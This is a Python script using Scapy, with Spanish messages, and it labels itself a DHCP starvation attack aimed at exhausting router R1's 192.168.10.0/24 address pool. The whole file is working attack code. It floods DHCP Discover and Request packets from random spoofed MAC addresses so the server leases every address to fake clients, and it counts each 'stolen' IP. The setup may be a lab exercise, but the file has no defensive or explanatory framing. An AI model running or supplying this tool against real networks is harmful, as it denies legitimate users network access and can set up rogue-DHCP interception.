#!/usr/bin/env python3
import random, sys, signal, time, threading
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, sniff, get_if_hwaddr, conf

RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
RESET  = "\033[0m"
BOLD   = "\033[1m"

IFACE     = "eth0"
SERVER_IP = "192.168.10.1"
stats     = {"leased": 0, "start": None}
pending   = {}
conf.verb = 0

def signal_handler(sig, frame):
    elapsed = time.time() - stats["start"]
    print(f"\n{YELLOW}[!] Ataque detenido.{RESET}")
    print(f"{GREEN}[+] IPs robadas: {stats['leased']} en {elapsed:.2f}s{RESET}")
    sys.exit(0)

def random_mac():
    return ":".join(f"{random.randint(0,255):02x}" for _ in range(6))

def mac_to_bytes(mac):
    return bytes(int(x, 16) for x in mac.split(":")) + b"\x00" * 10

def send_discover(mac, xid):
    pkt = (
        Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")
        / IP(src="0.0.0.0", dst="255.255.255.255")
        / UDP(sport=68, dport=67)
        / BOOTP(op=1, chaddr=mac_to_bytes(mac), xid=xid)
        / DHCP(options=[("message-type", "discover"), ("hostname", f"host-{random.randint(1000,9999)}"), "end"])
    )
    sendp(pkt, iface=IFACE, verbose=False)

def send_request(mac, xid, offered_ip, server_ip):
    pkt = (
        Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")
        / IP(src="0.0.0.0", dst="255.255.255.255")
        / UDP(sport=68, dport=67)
        / BOOTP(op=1, chaddr=mac_to_bytes(mac), xid=xid)
        / DHCP(options=[("message-type", "request"), ("server_id", server_ip), ("requested_addr", offered_ip), "end"])
    )
    sendp(pkt, iface=IFACE, verbose=False)

def handle_response(pkt):
    if not pkt.haslayer(DHCP) or not pkt.haslayer(BOOTP):
        return
    opts  = {o[0]: o[1] for o in pkt[DHCP].options if isinstance(o, tuple)}
    mtype = opts.get("message-type", 0)
    xid   = pkt[BOOTP].xid
    if mtype == 2 and xid in pending:
        mac        = pending[xid]["mac"]
        offered_ip = pkt[BOOTP].yiaddr
        server_ip  = opts.get("server_id", SERVER_IP)
        pending[xid]["offered"] = offered_ip
        print(f"{YELLOW}[*] OFFER: {offered_ip} para {mac}{RESET}", end="\r")
        send_request(mac, xid, offered_ip, server_ip)
    elif mtype == 5 and xid in pending:
        offered_ip = pkt[BOOTP].yiaddr
        mac        = pending[xid]["mac"]
        stats["leased"] += 1
        print(f"{RED}[+] IP ROBADA: {offered_ip} | MAC: {mac} | Total: {stats['leased']}{RESET}")
        del pending[xid]

def sniffer():
    sniff(iface=IFACE, filter="udp and (port 67 or port 68)", prn=handle_response, store=False)

def main():
    signal.signal(signal.SIGINT, signal_handler)
    print(f"""
{RED}{BOLD}
╔══════════════════════════════════════════════════╗
║        DHCP STARVATION ATTACK - Scapy            ║
║  Objetivo  : Agotar pool DHCP de R1              ║
║  Pool R1   : 192.168.10.0/24                     ║
╚══════════════════════════════════════════════════╝
{RESET}
{YELLOW}[!] Robando IPs del pool... Ctrl+C para detener{RESET}
""")
    stats["start"] = time.time()
    t = threading.Thread(target=sniffer, daemon=True)
    t.start()
    while True:
        mac = random_mac()
        xid = random.randint(1, 0xFFFFFFFF)
        pending[xid] = {"mac": mac, "offered": None}
        send_discover(mac, xid)
        time.sleep(0.1)

if __name__ == "__main__":
    main()
